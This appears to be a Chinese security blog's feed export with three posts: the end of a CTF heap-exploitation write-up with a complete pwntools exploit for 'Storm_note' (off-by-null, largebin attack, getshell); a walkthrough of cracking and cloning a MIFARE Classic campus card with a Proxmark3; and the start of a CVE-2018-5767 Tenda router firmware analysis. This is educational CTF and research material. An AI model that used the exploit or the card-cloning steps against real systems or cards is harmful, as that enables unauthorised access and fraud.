<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#6</span></span><br></pre></td></tr></table></figure></div>

<p>然后将 chunk1 删除，做 off-by-null，构造 overlap 的 largebin chunk。如法炮制，再构造另一个 overlap 的 largebin chunk。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#7</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)         <span class="comment"># 后向合并,构造第一个 overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x38</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)         <span class="comment"># 后向合并,构造第二个 overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x48</span>)     <span class="comment">#4</span></span><br></pre></td></tr></table></figure></div>

<p>overlap 的 chunk:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/large_bin_attack4.jpeg"
                     
                ></p>
<p>我们将两个 overlap 的 chunk 进行 free，unsortedbin 中呈现以下结构</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">较小的 chunk -&gt; 较大的 chunk</span><br></pre></td></tr></table></figure></div>

<p>然后通过 add(0x4e8) 将较大的 chunk 拿回来，那么小的那个就会进入 largebin。</p>
<p>再 delete 刚刚拿回来的 chunk，那么链表呈现以下结构</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">largebin： 较小的 chunk</span><br><span class="line">unsortedbin： 较大的 chunk</span><br></pre></td></tr></table></figure></div>

<p>此时通过 overlap 分别编辑位于 unsortedbin 和 largebin 中的 chunk 的指针，构造 largebin attack 的条件</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">storage = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">edit(<span class="number">7</span>, p1)</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the &quot;bk&quot; of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)   <span class="comment">#bk_nextsize, for creating the &quot;size&quot; of the faked chunk, using misalignment tricks</span></span><br><span class="line">edit(<span class="number">8</span>, p2)</span><br></pre></td></tr></table></figure></div>

<p>以上操作完成之后，再执行 add(0x48) 这个操作，ptmalloc 会先去 unsortedbin 寻找合适的 chunk，但是并不能找到，并且当前存在于 unsorted bin 中的 chunk 也不是 last_remainder 不会切割。于是会将这个 chunk 先插入到 largebin 中，由于我们已经修改了其中的指针，所以在插入 chunk 的过程中就会在目标区域写入 heap 的地址，利用错位即可构造出合适的 size。</p>
<p>malloc 在循环一圈之后回到循环起点，再次判断 bk 是否为空，但是 bk 此时已经指向了目标区域，这是由于插入 largebin 的过程中会先将 chunk 从 unsorted bin unlink，执行以下操作</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);</span><br></pre></td></tr></table></figure></div>

<p>其中 bck &#x3D; victim -&gt; bk</p>
<p>那么 unsorted_chunks(av)-&gt;bk &#x3D; victim -&gt; bk &#x3D; target</p>
<p>所以当再次循环到起点时，ptmalloc 检测到 bk 不为空，并且它指向的 chunk(target) 的 size 还正好和分配的 size 精确相等，所以直接将 chunk 取出，这里取出的就是 target，然后修改随机数 + 利用 backdoor 函数即可 getshell！</p>
<h2 id="完整-EXP"><a href="#完整-EXP" class="headerlink" title="完整 EXP"></a>完整 EXP</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./Storm_note&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,mes</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">  p.send(mes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#7</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)         <span class="comment"># 后向合并,构造第一个 overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x38</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)         <span class="comment"># 后向合并,构造第二个 overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x48</span>)     <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">storage = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">edit(<span class="number">7</span>, p1)</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the &quot;bk&quot; of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)   <span class="comment">#bk_nextsize, for creating the &quot;size&quot; of the faked chunk, using misalignment tricks</span></span><br><span class="line">edit(<span class="number">8</span>, p2)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>RFID 安全初探</title>
    <url>/2019/03/26/RFID/</url>
    <content><![CDATA[<p>RFID 相关内容。</p>
<span id="more"></span>

<h2 id="RFID-简介"><a href="#RFID-简介" class="headerlink" title="RFID 简介"></a>RFID 简介</h2><p>RFID(Radio Frequency Identification) 全称射频识别技术，这个名字大家可能比较陌生，但是提起我们生活中经常使用的饭卡，水卡，银行卡等等这些东西，大家应该很熟悉了。我们几乎每天都会使用这些小小的卡片，吃饭需要，取钱需要，甚至回家使用电梯也需要，可以说我们的生活已经离不开 RFID 这一技术了。</p>
<p>那么 RFID 到底是怎样的一门技术？针对它的攻防又会如何展开呢？这次我们就来简单探索一下关于 RFID 射频识别的攻与防。</p>
<p>首先要知道什么是 RFID，实际上它是一种自动识别技术，同一类的还包括条形码识别，OCR 等等，与 RFID 最为相关的就是智能卡(又称作<strong>电子标签</strong>)了，我们日常生活中用到的各种卡片大多数都属于智能卡，它们的构造很简单，从外观来看就是普通的塑料卡片，如果我们将卡片放在强光下照射，从另一面就能够清晰的看到卡片内部构造，首先是很多圈铜线绕成的线圈，这个线圈各种形状都有，但是以正方形，圆形和椭圆为主，在线圈中央存在一个非常小的芯片，一个 RFID 内部可能是下面这种形态</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-1.jpg"
                     
                ></p>
<p>线圈发挥着天线的作用，芯片中存储了这张卡的主要信息，例如一张饭卡，芯片中就可能存储了持卡人的姓名和 ID，还有余额，消费日期等等必要的信息。  </p>
<h3 id="铜圈天线"><a href="#铜圈天线" class="headerlink" title="铜圈天线"></a>铜圈天线</h3><p>一张 RFID 卡最显眼的就是那一圈一圈的天线，这里所说的天线可不是电视上那种天线，卡片中的天线是用来接收 RFID 读卡器传过来的信号的。RFID 的物理层实现有两种方式，一是电磁藕合，二是电磁反射。</p>
<p>首先说一说电磁藕合，这是智能卡非常常见的一种物理层实现方法，根据物理中电磁学的相关知识，我们可以很容易的理解它的原理，如下图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-2.jpg"
                     
                ></p>
<p>读卡器通过它的天线向外发射磁场，这时候如果我们将卡片靠近读卡器，根据电磁感应定律，卡片中的线圈就会出现电流，从而驱动智能卡中的芯片，这一过程叫做“激活”。</p>
<p>当 RFID 芯片被激活后，会主动发送应答信号到读卡器，读卡器接受信号将其解码送回电脑中的 APP 完成进一步操作。</p>
<p>电磁反射方式的智能卡完全依托读卡器的电磁信号，当信号接触到智能卡后，会激活内部的各种元件，生成相应的信息，附加在反射的磁场中返回读卡器。</p>
<h3 id="RFID-芯片"><a href="#RFID-芯片" class="headerlink" title="RFID 芯片"></a>RFID 芯片</h3><p>智能卡中的芯片包含很多类型，但是目前主要的有两种，一是非接触式存储卡，二是非接触式 CPU 卡。  </p>
<p>存储卡顾名思义，芯片中保存着定义好的信息，例如上面提到的饭卡，水卡，它们会将持卡人的各种信息保存在芯片中，当发生消费、充值等行为时更新卡中的数据。我们可以简单的将存储卡理解为卡中保存着一个微型数据库，并在使用卡的时候对数据库中的值进行更新。 </p>
<p>而 CPU 卡的功能就更加强劲了，卡中除了存储芯片，还包含一个微型 CPU 芯片，也就是说这种卡有一定的运算能力。</p>
<p>RFID 毕竟是依靠电磁波工作的一种设备，为了顾及其他行业的无线电服务(例如医疗、科学等)，RFID 有一套国际标准，规定了它的信号范围，由此产生了不同类型的卡片。通常 RFID 使用的频段是 ISM 频段，这是由国际通信联盟无线电通信局制定的一种标准，应用这些频段无需获得许可证或者缴纳任何费用，只是发射功率不能过大，不能影响到其他频段正常的无线电业务。</p>
<p>通常 RFID 使用的频段有 0 ~ 135kHZ，13.56mHZ，以及 24.125GHZ 等等，其中以 125kHZ 和 13.56 mHZ 最为广泛。</p>
<p>由于频段有高有低， RFID 又被分为三类，一是低频卡，二是高频卡，三是超高频卡。我们常用的卡片都属于低频和高频卡。</p>
<h3 id="低频卡"><a href="#低频卡" class="headerlink" title="低频卡"></a>低频卡</h3><p>低频卡通常工作在 125kHZ 这一频段，它具有以下特点</p>
<ol>
<li>不受无线电频率的管控。</li>
<li>识别距离一般小于 1m。</li>
<li>通常应用在动物识别，门禁，电子锁。</li>
<li>可存储的数据较少，数据传输速度较低。</li>
</ol>
<p>我们生活中有一种很常见的低频卡，那就是电梯和门禁卡，卡中的芯片不能存储大量的数据，所以这些卡中通常只存储了一个串号(或者称为 ID 号)，从外观上看，卡片呈圆形，蓝色，可以挂在钥匙扣上面。</p>
<h3 id="高频卡"><a href="#高频卡" class="headerlink" title="高频卡"></a>高频卡</h3><p>高频卡比低频卡更加常见，其有如下特点</p>
<ol>
<li>是使用量最大的电子标签之一。</li>
<li>数据传输速度很快。</li>
<li>时钟频率高，可以实现较高强度的加密。</li>
<li>通常应用在电子车票、电子身份证等。</li>
</ol>
<p>高频卡一般工作在 13.56mHZ，这种卡片不同于低频卡，它有更大的存储空间，甚至可以包含一定的运算能力，并且卡片出厂自带密码，这些密码用户可以自行修改，所以相对于低频卡来说，高频卡要更加安全。</p>
<h3 id="NFC-与-RFID"><a href="#NFC-与-RFID" class="headerlink" title="NFC 与 RFID"></a>NFC 与 RFID</h3><p>NFC(Near Field Communication) 近距离无线通讯技术，最初是由飞利浦公司和索尼公司共同开发的NFC是一种非接触式识别和互联技术。</p>
<p>NFC 是由 RFID 技术演变而来的，NFC 频段仅限于 13.56 mHZ，而 RFID 的频段要更加广泛一些，而且 NFC 卡的识别距离很短，大多在 10 cm 之内，而 RFID 卡的识别距离很广，例如高速收费站的 ETC 系统，识别距离达到了几米。  </p>
<p>NFC 更加适用于我们的日常生活适用，而 RFID 卡则更加偏向于工业上的应用，不过它们殊途同归，基本原理都是一样的。</p>
<h3 id="M1-卡"><a href="#M1-卡" class="headerlink" title="M1 卡"></a>M1 卡</h3><p>M1 卡指的是 Mifare 生产的 Mifare Classic 卡，这种卡目前还应用在很多的场景，这种卡的基本结构如图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-3.jpg"
                     
                ></p>
<p>在一次刷卡的过程中卡片和读卡器之间会产生很多信息交换，针对 M1 卡来说，我们可以将刷卡流程总结如下</p>
<ol>
<li>卡片处于休眠状态</li>
<li>读卡器发送电磁信号，激活卡片芯片。注意在同一时间内可能有多张卡等待唤醒。</li>
<li>进入防冲突循环，防止同一时间内唤醒多张卡片，产生数据读取冲突。当对应的卡片被选中的时候，卡片会向读卡器发送自身的卡号，这时此卡会被读卡器锁定，其他没有被选中的卡片会重新进入休眠状态</li>
<li>读卡器发送选卡(select card)指令，选定上一步锁定的卡片，进行卡片认证和存储器的操作。被选中的卡片会返回应答码(ATS&#x3D; 0x8)，向读卡器声明自己的类型。</li>
<li>三轮认证：读卡器选定卡片扇区，用扇区中的两组密钥进行数据校验，如果通过了三轮认证，之后的所有存储器操作(读卡、写卡)都是加密的。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-4.jpg"
                     
                ></p>
<p>M1 卡的存储器分为很多扇区，这些扇区内保存着不同的数据，每个扇区设定了两个密钥(key)，分为 KEYA 和 KEYB，参考下图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-5.jpg"
                     
                ></p>
<p>其中最为特殊的是零号扇区，它是卡片制造商在卡片出厂的时候设定的，一般包含写保护，也就是说我们不能随意更改 0 号扇区的数据。</p>
<p>除 0 号扇区之外，剩下的扇区用来存储用户数据，每个扇区有 48 个字节可以用来存储用户数据，而剩下的 16 个字节用来保存当前扇区的 KEYA 和 KEYB，以及一些控制位信息。</p>
<p>控制信息用来指明当前扇区的读写模式，例如可以将当前扇区指定为读写区块，或者数值区块等。</p>
<h3 id="UID、CUID、FUID-卡"><a href="#UID、CUID、FUID-卡" class="headerlink" title="UID、CUID、FUID 卡"></a>UID、CUID、FUID 卡</h3><p>*UID卡实际上都是 IC 卡(高频卡)的一种，它们完全兼容 M1 卡，所以可以将它们理解为一种特殊的 M1 卡，UID 卡有一个有趣的名字，叫做<strong>中国后门卡</strong>，它和普通的 M1 卡最大的区别是能够随意改写 0 号扇区的数据，所以经常被用来克隆卡片。UID 卡存在特殊的后门指令(还是中国人发明的，所以就叫做中国后门卡)，如果读卡机有反 UID 卡策略，就会向卡片发送后门指令，如果卡片对指令进行了响应，读卡机就会拒绝进一步的操作。</p>
<p>CUID 卡是 UID 的进化版，它的功能和 UID 卡相同但是不响应后门指令，所以被检测出来的概率要更小一些，和 UID 的区别在于虽然都能对 0 号扇区进行随意的读写，但是 CUID 读写是基于密码的，而 UID 直接通过指令读写。</p>
<p>FUID 则是 CUID 的进化版，虽然 CUID 卡不响应后门指令，但是还是有被检测的可能， 例如读卡机可以通过尝试修零号扇区(使用密码)来判断卡片是否为 CUID 卡。FUID 也可以对零号扇区进行改写，但是它只能修改一次，也就是说这种卡片出厂之后只有一次修改 0 号扇区的机会，修改之后 0 号扇区会被锁定，这时 FUID 卡和普通的 IC 卡就没什么区别了。显然 FUID 卡更难被检测和屏蔽。</p>
<h2 id="RFID-卡片克隆"><a href="#RFID-卡片克隆" class="headerlink" title="RFID 卡片克隆"></a>RFID 卡片克隆</h2><p><strong>本实验是完全的技术研究，实验中没有修改任何敏感数据！</strong></p>
<p>前面讲了那么多基础知识，现在就来上手实践一下。</p>
<h3 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h3><ol>
<li>卡片(M1 卡、UID 卡)</li>
<li>读卡器(如果有)</li>
<li>ProXmark3 RFID 修改开发版</li>
<li>一台电脑</li>
</ol>
<h3 id="ProXmark3"><a href="#ProXmark3" class="headerlink" title="ProXmark3"></a>ProXmark3</h3><p>Proxmark3是由Jonathan Westhues设计并且开发的开源硬件，其主要用RFID的嗅探、读取以及克隆等的操作。是因为原作者为了研究有关Mifare Classic硕士论文而生的。这款工具极大地降低了研究 RFID 的门槛。</p>
<p>不过这款硬件价格不菲，其官方售价一度达到 2000 人民币，不过由于其开源的性质，国内有很多厂家对硬件进行了仿制，目前在淘宝上大概 300 ~ 500 元就可以入手。</p>
<p>在 github 上面有 proxmark 的官方固件和工具，用来操控 proxmark 硬件，不过其命令行模式比较难用，因此，国内的一些开发者给命令行套上了一个外壳，制作出具有中文界面的 GUI 程序，我们需要做的只剩下装驱动了。如果你是在淘宝购买的 ProXmark，店家会赠送一些资料和驱动安装教程，只需要按照教程一步一步操作，应该不成问题。</p>
<h3 id="卡片复制"><a href="#卡片复制" class="headerlink" title="卡片复制"></a>卡片复制</h3><p>复制卡片是 RFID 最简单的一种攻击方式，虽然上面讲到 M1 卡的种种安全机制，但实际上早在 2008 年 M1 卡就被爆出有严重的漏洞，扇区加密形同虚设，我们只需要知道任意一个扇区的密钥(A 或 B，可以通过密钥爆破)，就能通过漏洞求出整张卡片全部的密钥，这一漏洞最直接的影响就是卡片复制，要知道当没有密钥的时候卡片中的数据不能被读取(就算读出来也是无用数据)，但是通过利用漏洞，攻击者就有机会计算出整张卡的密钥，从而获取卡中的完整数据，这时再结合 UID 卡的随意读写机制，攻击者能够对正常的卡片进行伪造，后果可想而知。</p>
<p>我们以 ** 学校校园卡为例，尝试卡片复制。</p>
<p>首先将 proxmark3 连接到电脑，打开软件，如果驱动没有异常，软件应该可以自动识别出串口号，如果没有就手动设置。最终界面应该如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-6.jpg"
                     
                ></p>
<p>这时候我们可以点击天线电压按钮测试硬件是否正常工作。点击后板上的蓝灯和红灯同时亮起，然后蓝灯熄灭，红灯常亮，表示正在测试电压，测试结束得出如下结果</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] LF antenna: 26.34 V - 125.00 kHz          </span><br><span class="line">[+] LF antenna: 31.58 V - 134.00 kHz          </span><br><span class="line">[+] LF optimal: 31.44 V - 131.87 kHz          </span><br><span class="line">[+] LF antenna is OK  </span><br><span class="line">          </span><br><span class="line">[+] HF antenna: 10.55 V - 13.56 MHz          </span><br><span class="line">[+] HF antenna is OK           </span><br><span class="line">          </span><br><span class="line">[+] Displaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.</span><br></pre></td></tr></table></figure></div>

<p>提示低频电压和高频电压稳定，硬件运行正常。</p>
<p>下面我们将待复制的卡片放在板子的高频卡阅读区域，点击软件中的读IC 卡类型返回了以下信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"> UID : E0 F3 12 17           </span><br><span class="line">ATQA : 00 04          </span><br><span class="line"> SAK : 08 [2]          </span><br><span class="line">TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1 | 1k Ev1          </span><br><span class="line">[=] proprietary non iso14443-4 card found, RATS not supported          </span><br><span class="line">[=] Answers to magic commands: NO          </span><br><span class="line">[+] Prng detection: WEAK          </span><br><span class="line">          </span><br><span class="line">[+] Valid ISO14443-A Tag Found</span><br></pre></td></tr></table></figure></div>

<p>卡的类型是 MIFARE CLASSIC 1k，并且提示我们 Prng detection: WEAK  ，表示卡片存在漏洞，我们能通过漏洞破解出整张卡片的密码！</p>
<p>点击软件中的默认密码扫描，然后等待一段时间，软件会自动从字典中加载密钥，尝试找到一个正确的 key，当找到任意一个 key 之后就能通过漏洞计算出全部 key，进而解码出整张卡片的数据。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-8.jpg"
                     
                ></p>
<p>获取到完整数据可以开始复制卡片，首先要找到一张 UID 卡，确保 0 号扇区能正常写入，将卡放在高频卡读卡区，点击 写 UID 卡，即可将数据写入 UID 卡内，至此我们已经完成了卡片的<strong>复制操作</strong>，将 UID 卡重新读取</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"> UID : E0 F3 12 17           </span><br><span class="line">ATQA : 00 04          </span><br><span class="line"> SAK : 08 [2]          </span><br><span class="line">TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1 | 1k Ev1          </span><br><span class="line">[=] proprietary non iso14443-4 card found, RATS not supported          </span><br><span class="line">[+] Answers to magic commands (GEN 1a): YES          </span><br><span class="line">[+] Prng detection: WEAK          </span><br><span class="line">          </span><br><span class="line">[+] Valid ISO14443-A Tag Found</span><br></pre></td></tr></table></figure></div>

<p>提示我们发现了 UID 卡，对后门指令存在响应。</p>
<p>取出的数据和原始卡片也是相同的！经测试复制卡能够正常通过门禁闸机，<strong>没有对消费进行测试!</strong></p>
<p><strong>RFID 仅为技术研究，请不要执行非法操作！</strong></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2018-5767</title>
    <url>/2019/03/19/CVE-2018-5767/</url>
    <content><![CDATA[<p>CVE-2018-5767 是 TENDA-AC15 型号路由器上的一个漏洞，产生的原因是没有限制用户的输入，使用函数 sscanf 直接将输入拷贝到栈上，导致栈溢出。</p>
<p>存在该漏洞的固件是 Tenda cn Ac15_firmware:15.03.1.16</p>
<span id="more"></span>

<h2 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h2><p>首先需要明确一点，IoT 设备的系统通常与 linux、Windows 不同，由于设备的资源有限，它们的操作系统相对比较简洁，而且许多 IOT 设备使用的都是一些不是很常见的指令集(多数使用了精简指令集)，这就需要我们了解这些 CPU 架构以及指令集的特性，才能分析固件中的程序。</p>
<p>幸运的是，TENDA(至少是 AC15)的 CPU 是 ARM 架构的，提取的程序可以直接使用 IDA 进行反编译。</p>
<p>首先要下载官方的路由器软件包，打开TENDA 的官网，在里面找到 AC15 路由器的支持页面下载固件，<a class="link"   href="https://www.tenda.com.cn/product/support/AC15.html" >链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>下载到本地的是一个.bin 文件，大小约为 10 MB，file 一下发现这其实是一个迷你的镜像</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  Desktop file US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin </span><br><span class="line">US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin: u-boot legacy uImage, \002, Linux/ARM, OS Kernel Image (lzma), 10227712 bytes, Thu Nov 19 09:36:45 2015, Load Address: 0x80000000, Entry Point: 0xC0008000, Header CRC: 0x73CF0D74, Data CRC: 0x3321F349</span><br></pre></td></tr></table></figure></div>

<p>file 指出它是 u-boot legacy uImage 格式的镜像文件，在百度上可以找到一些详细的解释，简单来说，它就是 Linux 为 ARM 架构打造的小型启动镜像，我们可以将它理解为类似于 IOS 的镜像。</p>
<p>既然是镜像，就能够通过一些手段来提取它内部的文件，首先明确此镜像的文件系统格式，通常可以使用 binwalk ，以这个固件为例，用 binwalk 跑一下得到的信息：</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">\--------------------------------------------------------------------------------</span><br><span class="line">64            0x40            TRX firmware header, little endian, image size: 10227712 bytes, CRC32: 0x314DBDAC, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x198CDC, rootfs offset: 0x0</span><br><span class="line">92            0x5C            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 4114848 bytes</span><br><span class="line">1674524       0x198D1C        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 8549574 bytes, 741 inodes, blocksize: 131072 bytes, created: 2015-11-19 09:36:43 </span><br></pre></td></tr></table></figure></div>

